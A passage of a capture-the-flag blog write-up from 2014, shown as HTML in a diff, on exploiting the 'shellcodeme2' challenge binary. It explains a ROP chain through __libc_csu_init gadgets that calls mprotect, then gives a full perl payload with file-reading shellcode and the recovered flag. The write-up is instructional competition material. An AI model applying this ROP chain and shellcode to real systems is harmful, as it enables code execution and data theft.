+</span><span class='line'>   <span class="mh">0x400679</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">call</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r12</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span>
+</span><span class='line'>   <span class="mh">0x40067d</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">add</span>    <span class="n">rbx</span><span class="p">,</span><span class="mh">0x1</span>
+</span><span class='line'>   <span class="mh">0x400681</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">81</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nb">cmp</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">rbp</span> 
+</span><span class='line'>   <span class="mh">0x400684</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">jne</span>    <span class="mh">0x400670</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span>
+</span><span class='line'>   <span class="mh">0x400686</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">86</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">add</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x8</span>
+</span><span class='line'>   <span class="mh">0x40068a</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">rbx</span>
+</span><span class='line'>   <span class="mh">0x40068b</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">rbp</span>
+</span><span class='line'>   <span class="mh">0x40068c</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r12</span>
+</span><span class='line'>   <span class="mh">0x40068e</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">94</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r13</span>
+</span><span class='line'>   <span class="mh">0x400690</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r14</span>
+</span><span class='line'>   <span class="mh">0x400692</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">98</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r15</span>
+</span><span class='line'>   <span class="mh">0x400694</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>First <code>ebp</code> is copied to <code>edx</code>. Then <code>rsi</code> and <code>edi</code> are set. Then we call the QWORD pointer at a memory address referenced by <code>esi</code> and <code>ebx</code>. I chose to <code>esi</code> and <code>ebx</code> such that they point to the got pointer of mprotect.</p>
+
+<p>The problem arises after returning from the mprotect call:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x40067d &lt;__libc_csu_init+77&gt;:  add    rbx,0x1
+</span><span class='line'>   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp
+</span><span class='line'>   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So I needed to make sure that <code>rbx</code> and <code>rbp</code> were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting <code>rbx</code> to <code>rbp-1</code>. Only thing left was to adjust <code>esi</code> and away we go! With the problem of setting <code>edx</code> out of the way, I could call mprotect to set <code>0x20000000</code> to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary.</p>
+
+<p>I sprinkled in some <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.php">shellcode magic</a> and was able to exploit the binary locally!</p>
+
+<p>Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">output</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">output</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x&quot;</span> <span class="o">+</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">:</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">output</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn&rsquo;t work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read <code>flag</code> instead of <code>/etc/passwd</code>. For this, I had to adjust the offset:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">xor</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="mh">0x41</span>
+</span><span class='line'><span class="o">--&gt;</span>
+</span><span class='line'><span class="n">xor</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span> <span class="mh">0x41</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And <strong>finally</strong>, starting from the first binary:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python exploit.py
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span>
+</span><span class='line'><span class="o">(</span>perl -e <span class="s1">&#39;print &quot;\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00&quot;&#39;</span><span class="p">;</span> perl -e <span class="s1">&#39;print &quot;\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41&quot;&#39;</span><span class="o">)</span> <span class="p">|</span> ./shellcodeme2
+</span><span class='line'>ADCTF_I_l0v3_tH15_4W350M3_m15T4K
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This one was tough, but a fun one nonetheless! ROP all the things! =)</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-12-24T11:37:46+01:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:37 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/binary/'>binary</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/exploitation/'>exploitation</a>, <a class='category' href='/blog/categories/pwnable/'>pwnable</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/" data-via="" data-counturl="http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/12/21/advent-ctf-2014-rotate/" title="Previous Post: Advent CTF 2014 - rotate">&laquo; Advent CTF 2014 - rotate</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/12/24/advent-ctf-2014-bruteforce/" title="Next Post: Advent CTF 2014 - Bruteforce">Advent CTF 2014 - Bruteforce &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/12/24/advent-ctf-2014-bruteforce/">Advent CTF 2014 - Bruteforce</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/24/advent-ctf-2014-shellcodeme/">Advent CTF 2014 - Shellcodeme</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/21/advent-ctf-2014-rotate/">Advent CTF 2014 - Rotate</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/21/advent-ctf-easypwn/">Advent CTF 2014 - Easypwn</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/17/adctf-2014-oh-my-scanf/">Advent CTF 2014 - Oh My Scanf</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - barrebas -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'barrebas';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/';
+        var disqus_url = 'http://barrebas.github.io/blog/2014/12/24/advent-ctf-2014-shellcodeme/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
